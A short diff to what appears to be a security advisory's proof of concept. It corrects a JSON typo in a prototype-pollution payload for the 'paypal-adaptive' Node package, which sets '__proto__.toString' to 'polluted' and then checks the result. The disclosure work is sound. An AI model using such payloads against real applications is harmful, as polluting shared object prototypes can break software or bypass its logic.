@@ -54,7 +54,7 @@ PoC
 
 ```javascript
 var PayPal = require ('paypal-adaptive');
-var p = new PayPal(JSON.parse('{"__proto__":{"toString":"polluted"},"userId":"foo""password":"bar","signature":"abcd","appId":"1234","sandbox":"1234"}'))
+var p = new PayPal(JSON.parse('{"__proto__":{"toString":"polluted"},"userId":"foo","password":"bar","signature":"abcd","appId":"1234","sandbox":"1234"}'))
 console.log(({}).toString);
 ```
 
